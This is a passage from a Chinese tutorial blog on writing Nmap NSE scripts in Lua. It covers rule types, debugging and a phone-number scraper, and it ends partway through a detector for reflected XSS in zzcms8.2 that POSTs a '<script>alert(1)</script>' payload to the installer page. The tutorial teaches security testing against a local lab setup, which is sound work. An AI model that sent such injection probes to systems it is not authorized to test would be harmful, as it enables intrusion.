@usage</span></span><br><span class="line"><span class="comment">-- nmap --script prerule &lt;target&gt;</span></span><br><span class="line"><span class="comment">-- @output</span></span><br><span class="line"><span class="comment">-- Pre-scan script results:</span></span><br><span class="line"><span class="comment">-- |_prerule: HongRi AnQuan test prerule</span></span><br><span class="line"><span class="comment">-- Version 0.1</span></span><br><span class="line"><span class="comment">-- Created 21/3/2018 - v0.1 - created by yumu &lt;http://www.sec-redclub.com/&gt;</span></span><br><span class="line"><span class="comment">---</span></span><br><span class="line"></span><br><span class="line">author = <span class="string">"HongRi yumu"</span></span><br><span class="line">license = <span class="string">"Same as Nmap--See http://nmap.org/book/man-legal.html"</span></span><br><span class="line">categories = &#123;<span class="string">"default"</span>,<span class="string">"safe"</span>&#125;</span><br><span class="line"></span><br><span class="line">prerule = <span class="function"><span class="keyword">function</span><span class="params">(host,port)</span></span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">action = <span class="function"><span class="keyword">function</span><span class="params">(host, port)</span></span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">"RongRi AnQuan NSE script Prerule test"</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p><img src="http://owv5lapar.bkt.clouddn.com/prerule.jpg" alt="prerule"></p>
<hr>
<p>我们都知道在<strong>测试阶段</strong>我们难免会出现错误,那假设我们出现了<strong>错误</strong>我们应该如何解决呢。这时我们需要借助Nmap的调试模式进行调试。还是老规矩举个栗子：<strong>那我这里新建一个preruleDebug.nse文件让它打印系统信息故意让其出错（至于为啥会出错后面会解释），然后调试一下给大家看。我们只需要加上-d选项即可进入调试模式，那一般我这边是-d 3,3代表的是等级，等级越高，越详细。-d 3打印的调试的信息已经足够详细了，所以我习惯选择-d 3.</strong></p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- preruleDebug.nse</span></span><br><span class="line">description = <span class="string">[[prerule test]]</span></span><br><span class="line"><span class="comment">---</span></span><br><span class="line"><span class="comment">--@usage</span></span><br><span class="line"><span class="comment">-- nmap --script preruleDebug -p 80 &lt;target&gt;</span></span><br><span class="line"><span class="comment">-- @output</span></span><br><span class="line"><span class="comment">-- Pre-scan script results:</span></span><br><span class="line"><span class="comment">-- |_prerule: HongRi AnQuan test prerule</span></span><br><span class="line"><span class="comment">-- Version 0.1</span></span><br><span class="line"><span class="comment">-- Created 21/3/2018 - v0.1 - created by yumu &lt;http://www.sec-redclub.com/&gt;</span></span><br><span class="line"><span class="comment">---</span></span><br><span class="line"></span><br><span class="line">author = <span class="string">"HongRi yumu"</span></span><br><span class="line">license = <span class="string">"Same as Nmap--See http://nmap.org/book/man-legal.html"</span></span><br><span class="line">categories = &#123;<span class="string">"default"</span>,<span class="string">"safe"</span>&#125;</span><br><span class="line"></span><br><span class="line">prerule = <span class="function"><span class="keyword">function</span><span class="params">(host,port)</span></span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">action = <span class="function"><span class="keyword">function</span><span class="params">(host, port)</span></span></span><br><span class="line">	<span class="keyword">return</span> host.<span class="built_in">os</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>错误界面如图所示：</p>
<p><img src="http://owv5lapar.bkt.clouddn.com/preruleDebug1.jpg" alt="preruleDebug1"></p>
<p>调试模式如图所示:</p>
<p><img src="http://owv5lapar.bkt.clouddn.com/preruleDebug2.jpg" alt="preruleDebug2"></p>
<p>我们从图中可以看到出错原因是因为<strong>prerule threw an error!</strong>看到详细原因是因为<strong>attempt to index a nil value (local ‘host’)</strong>意思是说host是个无效值。原因是：<strong>我们知道prerule是在Nmap扫描之前触发脚本的。那也就是说我们是无法在action中打印出操作系统信息。</strong>好了，到这里大家也应该知道如何调试错误了。</p>
<hr>
<p><strong>听说，对比产生美</strong></p>
<p>我们都知道对比产生美，那我们在这个错误的模板上改一下规则让它变成hostrule，看看结果如何。</p>
<p><strong>Hostrule</strong></p>
<p><strong>Hostrule会在Namp执行主机发现或探测进行触发。</strong></p>
<p>举个栗子：新建一个hostrule.nse文件。复制上面preruleDebug.nse的代码，但是做一点改动，就是Rule的类型改为Hostrule。然后运行能否打印我们想要的系统信息(嘻嘻，结果当然是成功打印啦)。</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- hostrule.nse</span></span><br><span class="line">description = <span class="string">[[hostrule test]]</span></span><br><span class="line"><span class="comment">---</span></span><br><span class="line"><span class="comment">--@usage</span></span><br><span class="line"><span class="comment">-- nmap -O --script hostrule  &lt;target&gt;</span></span><br><span class="line"><span class="comment">-- @output</span></span><br><span class="line"><span class="comment">-- Host script results:</span></span><br><span class="line"><span class="comment">-- |     hostrule:</span></span><br><span class="line"><span class="comment">-- |</span></span><br><span class="line"><span class="comment">-- |     name: Microsoft Windows 7 or 8.1 R1</span></span><br><span class="line"><span class="comment">-- |     classes:</span></span><br><span class="line"><span class="comment">-- |</span></span><br><span class="line"><span class="comment">-- |         cpe:</span></span><br><span class="line"><span class="comment">-- |           cpe:/o:microsoft:windows_7</span></span><br><span class="line"><span class="comment">-- |         osgen: 7</span></span><br><span class="line"><span class="comment">-- |         vendor: Microsoft</span></span><br><span class="line"><span class="comment">-- |         osfamily: Windows</span></span><br><span class="line"><span class="comment">-- |         type: general purpose</span></span><br><span class="line"><span class="comment">-- |</span></span><br><span class="line"><span class="comment">-- |         cpe:</span></span><br><span class="line"><span class="comment">-- |           cpe:/o:microsoft:windows_8.1:r1</span></span><br><span class="line"><span class="comment">-- |         osgen: 8.1</span></span><br><span class="line"><span class="comment">-- |         vendor: Microsoft</span></span><br><span class="line"><span class="comment">-- |         osfamily: Windows</span></span><br><span class="line"><span class="comment">-- |_        type: general purpose</span></span><br><span class="line"><span class="comment">-- Version 0.1</span></span><br><span class="line"><span class="comment">-- Created 21/3/2018 - v0.1 - created by yumu &lt;http://www.sec-redclub.com/&gt;</span></span><br><span class="line"><span class="comment">---</span></span><br><span class="line"></span><br><span class="line">author = <span class="string">"HongRi yumu"</span></span><br><span class="line">license = <span class="string">"Same as Nmap--See http://nmap.org/book/man-legal.html"</span></span><br><span class="line">categories = &#123;<span class="string">"default"</span>,<span class="string">"safe"</span>&#125;</span><br><span class="line">hostrule = <span class="function"><span class="keyword">function</span><span class="params">(host,port)</span></span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"></span><br><span class="line">action = <span class="function"><span class="keyword">function</span><span class="params">(host, port)</span></span></span><br><span class="line">	<span class="keyword">return</span> host.<span class="built_in">os</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p><img src="http://owv5lapar.bkt.clouddn.com/carbon6.png" alt="carbon (3)"></p>
<p><strong>Portrule</strong></p>
<p><strong>Portrule会在Namp执行端口扫描时触发脚本。</strong></p>
<p>举个栗子：新建portrule.nse文件，代码如下，然后我们扫描几个端口然后看看是否在扫描端口的时候打印出“Hongri Anquan yumu”和host.ip。</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- portrule.nse</span></span><br><span class="line"><span class="keyword">local</span> stdnse = <span class="built_in">require</span> <span class="string">"stdnse"</span></span><br><span class="line"><span class="keyword">local</span> <span class="built_in">table</span> = <span class="built_in">require</span> <span class="string">"table"</span></span><br><span class="line"><span class="comment">-- stdnse 标准输出库</span></span><br><span class="line"><span class="comment">-- table table库</span></span><br><span class="line">description = <span class="string">[[portrule test]]</span></span><br><span class="line"><span class="comment">---</span></span><br><span class="line"><span class="comment">-- @usage</span></span><br><span class="line"><span class="comment">-- nmap -p 80,443,3306 --script portrule -p 80 &lt;target&gt;</span></span><br><span class="line"><span class="comment">-- @output</span></span><br><span class="line"><span class="comment">-- 80/tcp   open   http</span></span><br><span class="line"><span class="comment">-- | portrule:</span></span><br><span class="line"><span class="comment">-- |   127.0.0.1</span></span><br><span class="line"><span class="comment">-- |_  From: Hongri Anquan yumu</span></span><br><span class="line"><span class="comment">-- Version 0.1</span></span><br><span class="line"><span class="comment">-- Created 21/3/2018 - v0.1 - created by yumu &lt;http://www.sec-redclub.com/&gt;</span></span><br><span class="line"><span class="comment">---</span></span><br><span class="line"></span><br><span class="line">author = <span class="string">"HongRi yumu"</span></span><br><span class="line">license = <span class="string">"Same as Nmap--See http://nmap.org/book/man-legal.html"</span></span><br><span class="line">categories = &#123;<span class="string">"default"</span>,<span class="string">"safe"</span>&#125;</span><br><span class="line">portrule = <span class="function"><span class="keyword">function</span><span class="params">(host,port)</span></span></span><br><span class="line">   <span class="keyword">return</span> port.protocol == <span class="string">"tcp"</span> <span class="keyword">and</span> port.state == <span class="string">"open"</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- 判断目标端口运行的协议是否为tcp协议并且端口是否开放状态</span></span><br><span class="line"><span class="comment">-- 当返回true时，执行action函数，反之不执行</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">(host,port)</span></span></span><br><span class="line">	<span class="keyword">local</span> table_input = &#123;&#125;</span><br><span class="line">	<span class="keyword">local</span> user = <span class="string">"Hongri Anquan yumu"</span></span><br><span class="line">	<span class="built_in">table</span>.<span class="built_in">insert</span>(table_input,host.ip)</span><br><span class="line">	<span class="built_in">table</span>.<span class="built_in">insert</span>(table_input,<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">"From: %s"</span>, user))</span><br><span class="line">	<span class="keyword">return</span> stdnse.format_output(<span class="literal">true</span>, table_input)</span><br><span class="line">    <span class="comment">-- 输出“Hongri Anquan yumu”和host.ip信息</span></span><br><span class="line">	<span class="comment">-- stdnse.format_output: Formatted output looks better</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="http://owv5lapar.bkt.clouddn.com/portrule1.jpg" alt="portrule1"></p>
<p><strong>再举一个栗子：小试牛刀，我们写一个Nse脚本来获取zzcms8.2网站上的客服电话号码。</strong></p>
<p><img src="http://owv5lapar.bkt.clouddn.com/portrule2.jpg" alt="portrule2"></p>
<p><strong>参数知识扩展</strong></p>
<table>
<thead>
<tr>
<th>http</th>
<th>库</th>
</tr>
</thead>
<tbody><tr>
<td>get()</td>
<td>发起get请求，请求结果以一个table的形式返回</td>
</tr>
<tr>
<td>host</td>
<td>要请求的主机</td>
</tr>
<tr>
<td>path</td>
<td>要检索的路径</td>
</tr>
<tr>
<td>options</td>
<td>可选，允许调用者控制socket,请求头的table</td>
</tr>
<tr>
<td>port</td>
<td>要检索的端口</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td>post()</td>
<td>发起post请求，请求结果以一个table的形式返回</td>
</tr>
<tr>
<td>ignored</td>
<td>向后兼用，一般填写nil，忽略即可</td>
</tr>
<tr>
<td>postdata</td>
<td>post数据，字符串或者table格式</td>
</tr>
<tr>
<td>host</td>
<td>要请求的主机</td>
</tr>
<tr>
<td>path</td>
<td>要检索的路径</td>
</tr>
<tr>
<td>options</td>
<td>可选，允许调用者控制socket,请求头,超时时间的table</td>
</tr>
<tr>
<td>port</td>
<td>要检索的端口</td>
</tr>
</tbody></table>
<p><strong>注意小细节</strong></p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 1.方法解释</span></span><br><span class="line"><span class="comment">-- string.match(str, pattern, init)</span></span><br><span class="line"><span class="comment">-- string.match()只寻找源字串str中的第一个配对. 参数init可选, 指定搜寻过程的起点, 默认为1。 </span></span><br><span class="line"><span class="comment">-- 在成功配对时, 函数将返回配对表达式中的所有捕获结果; 如果没有设置捕获标记, 则返回整个配对字符串. 当没有---- 成功的配对时, 返回nil。</span></span><br><span class="line"><span class="comment">-- 2.乱码问题解决方法</span></span><br><span class="line"><span class="comment">-- 打印的response.body（响应体）在cmder可能会显示乱码。解决方法如下：</span></span><br><span class="line"><span class="comment">-- cmd命令行窗口字符编码切换为UTF-8，命令行中执行：chcp 65001</span></span><br></pre></td></tr></table></figure>

<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- portrulenumber.nse</span></span><br><span class="line"><span class="keyword">local</span> stdnse = <span class="built_in">require</span> <span class="string">"stdnse"</span></span><br><span class="line"><span class="keyword">local</span> <span class="built_in">table</span> = <span class="built_in">require</span> <span class="string">"table"</span></span><br><span class="line"><span class="keyword">local</span> shortport = <span class="built_in">require</span> <span class="string">"shortport"</span></span><br><span class="line"><span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">"http"</span></span><br><span class="line"><span class="keyword">local</span> <span class="built_in">string</span> = <span class="built_in">require</span> <span class="string">"string"</span></span><br><span class="line"></span><br><span class="line">description = <span class="string">[[Get the phone number of the customer service]]</span></span><br><span class="line"><span class="comment">---</span></span><br><span class="line"><span class="comment">--@usage</span></span><br><span class="line"><span class="comment">-- nmap --script portrulenumber -p 80 &lt;target&gt;</span></span><br><span class="line"><span class="comment">-- @output                                                  </span></span><br><span class="line"><span class="comment">-- PORT   STATE SERVICE                              </span></span><br><span class="line"><span class="comment">-- 80/tcp open  http                                 </span></span><br><span class="line"><span class="comment">-- |_portrulenumber: consumer hotline:0371-86137281  </span></span><br><span class="line"><span class="comment">-- Version 0.1</span></span><br><span class="line"><span class="comment">-- Created 21/3/2018 - v0.1 - created by yumu &lt;http://www.sec-redclub.com/&gt;</span></span><br><span class="line"><span class="comment">---</span></span><br><span class="line"></span><br><span class="line">author = <span class="string">"HongRi yumu"</span></span><br><span class="line">license = <span class="string">"Same as Nmap--See http://nmap.org/book/man-legal.html"</span></span><br><span class="line">categories = &#123;<span class="string">"default"</span>,<span class="string">"safe"</span>&#125;</span><br><span class="line"></span><br><span class="line">portrule = shortport.http</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">(host,port)</span></span></span><br><span class="line">	<span class="keyword">local</span> telephone_number,baseurl</span><br><span class="line">	baseurl = <span class="string">"/"</span></span><br><span class="line">	response = http.get(host,port,baseurl)</span><br><span class="line">	telephone_number = <span class="built_in">string</span>.<span class="built_in">match</span>(response.body,<span class="string">"%d+-%d+"</span>)</span><br><span class="line">	<span class="keyword">if</span>  telephone_number ~= <span class="literal">nil</span></span><br><span class="line">	<span class="keyword">then</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">"consumer hotline:"</span>..telephone_number</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">"Hongri Auquan"</span></span><br><span class="line">	<span class="keyword">end</span>	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p><img src="http://owv5lapar.bkt.clouddn.com/portruleNumber.jpg" alt="portruleNumber"></p>
<hr>
<h4 id="Postrule"><a href="#Postrule" class="headerlink" title="Postrule"></a>Postrule</h4><p><strong>Portrule会在Namp结束时触发脚本，通常用于扫描结果的数据提取和整理。</strong></p>
<p>举个栗子：  触发时候打印”Hongri Anquan test postrule”</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- postrule.nse</span></span><br><span class="line">description = <span class="string">[[postrule test]]</span></span><br><span class="line"><span class="comment">---</span></span><br><span class="line"><span class="comment">--@usage</span></span><br><span class="line"><span class="comment">-- nmap --script postrule ![postrule](http://owv5lapar.bkt.clouddn.com/postrule.jpg)![postrule](http://owv5lapar.bkt.clouddn.com/postrule.jpg)&lt;target&gt;</span></span><br><span class="line"><span class="comment">-- @output</span></span><br><span class="line"><span class="comment">-- Pre-scan script results:</span></span><br><span class="line"><span class="comment">-- |_prerule: HongRi AnQuan test prerule</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- Version 0.1</span></span><br><span class="line"><span class="comment">-- Created 21/3/2018 - v0.1 - created by yumu &lt;http://www.sec-redclub.com/&gt;</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">---</span></span><br><span class="line"></span><br><span class="line">author = <span class="string">"HongRi yumu"</span></span><br><span class="line">license = <span class="string">"Same as Nmap--See http://nmap.org/book/man-legal.html"</span></span><br><span class="line">categories = &#123;<span class="string">"default"</span>,<span class="string">"safe"</span>&#125;</span><br><span class="line"></span><br><span class="line">postrule = <span class="function"><span class="keyword">function</span><span class="params">(host,port)</span></span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">action = <span class="function"><span class="keyword">function</span><span class="params">(host, port)</span></span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">"Hongri Anquan test postrule"</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p><img src="http://owv5lapar.bkt.clouddn.com/postrule.jpg" alt="postrule"></p>
<p>####初出茅庐，实战编写脚本探测zzcms8.2 反射型XSS</p>
<p>需要详细了解zzcms8.2代码审计的内容请到：<a href="https://bbs.ichunqiu.com/thread-36147-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-36147-1-1.html</a></p>
<p>那我这里本地搭建了环境，然后我先简单使用火狐测试一下是否存在反射型xss。废话不说，打字累人，看操作。</p>
<p><img src="http://owv5lapar.bkt.clouddn.com/zzcms1.jpg" alt="zzcms1"></p>
<p><img src="http://owv5lapar.bkt.clouddn.com/zzcm5.jpg" alt="zzcm5"></p>
<p><img src="http://owv5lapar.bkt.clouddn.com/zzmcs2.jpg" alt="zzmcs2"></p>
<p>嗯，只要玩过web渗透的都应该知道此时源码当中肯定插入了<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>,这点必须清楚，因为这是我们后面编写Nse脚本思路。</p>
<p><img src="http://owv5lapar.bkt.clouddn.com/zzcms3.jpg" alt="zzcms3"></p>
<p><img src="http://owv5lapar.bkt.clouddn.com/zzcms4.jpg" alt="zzcms4"></p>
<p>好。我们来看看图，确定编写思路。</p>
<p><img src="http://owv5lapar.bkt.clouddn.com/zzcms6.png" alt="zzcms6"></p>
<p>看完四步的你应该很清晰如何编写我们的脚本了，那就开干吧。我这里新建一个zzcmsxss.nse,代码如下：</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">"http"</span></span><br><span class="line"><span class="keyword">local</span> shortport = <span class="built_in">require</span> <span class="string">"shortport"</span></span><br><span class="line"><span class="keyword">local</span> <span class="built_in">string</span> = <span class="built_in">require</span> <span class="string">"string"</span></span><br><span class="line"><span class="keyword">local</span> stdnse = <span class="built_in">require</span> <span class="string">"stdnse"</span></span><br><span class="line"><span class="keyword">local</span> <span class="built_in">table</span> = <span class="built_in">require</span> <span class="string">"table"</span></span><br><span class="line"></span><br><span class="line">description = <span class="string">[[Detecting the presence of reflective xss in zzcms8.2]]</span></span><br><span class="line"><span class="comment">---</span></span><br><span class="line"><span class="comment">-- @usage</span></span><br><span class="line"><span class="comment">-- nmap --script zzcmsxss -p 80 &lt;target&gt;</span></span><br><span class="line"><span class="comment">-- nmap --script zzcmsxss -p 80 --script-args zzcmsxss.url-path='/website' &lt;target&gt;</span></span><br><span class="line"><span class="comment">-- @output</span></span><br><span class="line"><span class="comment">-- PORT   STATE SERVICE</span></span><br><span class="line"><span class="comment">-- 80/tcp open  http</span></span><br><span class="line"><span class="comment">-- | zzcmsxss:</span></span><br><span class="line"><span class="comment">-- |_  Final Results: Reflective xss exists</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- @xmloutput</span></span><br><span class="line"><span class="comment">-- &lt;ports&gt;</span></span><br><span class="line"><span class="comment">-- &lt;port protocol="tcp" portid="80"&gt;&lt;state state="open" reason="syn-ack" reason_ttl="128"/&gt;</span></span><br><span class="line"><span class="comment">-- &lt;service name="http" method="table" conf="3"/&gt;</span></span><br><span class="line"><span class="comment">-- &lt;script id="zzcmsxss" output="&amp;#xa;  Final Results: Reflective xss exists&amp;#xa;"/&gt;</span></span><br><span class="line"><span class="comment">-- &lt;/port&gt;</span></span><br><span class="line"><span class="comment">-- &lt;/ports&gt;</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- Version 0.1</span></span><br><span class="line"><span class="comment">-- Created 21/3/2018 - v0.1 - created by yumu &lt;http://www.sec-redclub.com/&gt;</span></span><br><span class="line"><span class="comment">---</span></span><br><span class="line"></span><br><span class="line">author = <span class="string">"HongRi yumu"</span></span><br><span class="line">license = <span class="string">"Same as Nmap--See http://nmap.org/book/man-legal.html"</span></span><br><span class="line">categories = &#123;<span class="string">"default"</span>,<span class="string">"safe"</span>,<span class="string">"discovery"</span>,<span class="string">"version"</span>&#125;</span><br><span class="line"></span><br><span class="line">portrule = <span class="function"><span class="keyword">function</span><span class="params">(host,port)</span></span></span><br><span class="line">   <span class="keyword">return</span> port.protocol == <span class="string">"tcp"</span> <span class="keyword">and</span> port.state == <span class="string">"open"</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> FLAG = <span class="string">"alert"</span></span><br><span class="line">action = <span class="function"><span class="keyword">function</span><span class="params">(host, port)</span></span></span><br><span class="line">	</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">"port.numner is : "</span>,port.number)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">"port status is : "</span>,port.state)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">local</span> table_input = &#123;&#125;</span><br><span class="line">   <span class="keyword">local</span> xss_exit = <span class="string">"Reflective xss exists"</span></span><br><span class="line">   <span class="keyword">local</span> xss_not_exit = <span class="string">"Reflective xss does not exist"</span></span><br><span class="line">   <span class="keyword">local</span> basepath = stdnse.get_script_args(SCRIPT_NAME .. <span class="string">".url-path"</span>) <span class="keyword">or</span> <span class="string">'/install/index.php'</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">local</span> options=&#123;headers = &#123;</span><br><span class="line">   [<span class="string">"Accept"</span>]=<span class="string">"text/html,application/xhtml+xm…plication/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">   [<span class="string">"Accept-Language"</span>]=<span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span>,</span><br><span class="line">   [<span class="string">"Accept-Encoding"</span>]=<span class="string">"gzip, deflate"</span>,</span><br><span class="line">   [<span class="string">"User-Agent"</span>] = <span class="string">"Mozilla/5.0 (Windows NT 6.1; W…) Gecko/20100101 Firefox/58.0"</span>,</span><br><span class="line">   [<span class="string">"Host"</span>] = host.name,</span><br><span class="line">   [<span class="string">"Referer"</span>]=<span class="string">"http://"</span>.. host.name ..<span class="string">"/install/index.php"</span>,</span><br><span class="line">   [<span class="string">"Content-Type"</span>]=<span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">   [<span class="string">"Connection"</span>]=<span class="string">"Keep-alive"</span>,</span><br><span class="line">   [<span class="string">"Content-length"</span>]=<span class="number">76</span>,</span><br><span class="line">   [<span class="string">"Upgrade-Insecure-Requests"</span>]=<span class="number">1</span>,</span><br><span class="line">   &#125; &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">local</span> postdata = &#123;</span><br><span class="line">	[<span class="string">"admin"</span>]=<span class="string">"admin"</span>,</span><br><span class="line">	[<span class="string">"adminpwdtrue"</span>]=<span class="string">"admin&lt;script&gt;alert(1)&lt;/script&gt;"</span>,</span><br><span class="line">	[<span class="string">"step"</span>]=<span class="number">6</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">local</span> response= http.post(host,port,basepath,options,<span class="literal">nil</span>,postdata)  <span class="comment">-- 发送post请求 </span></span><br><span class="line">   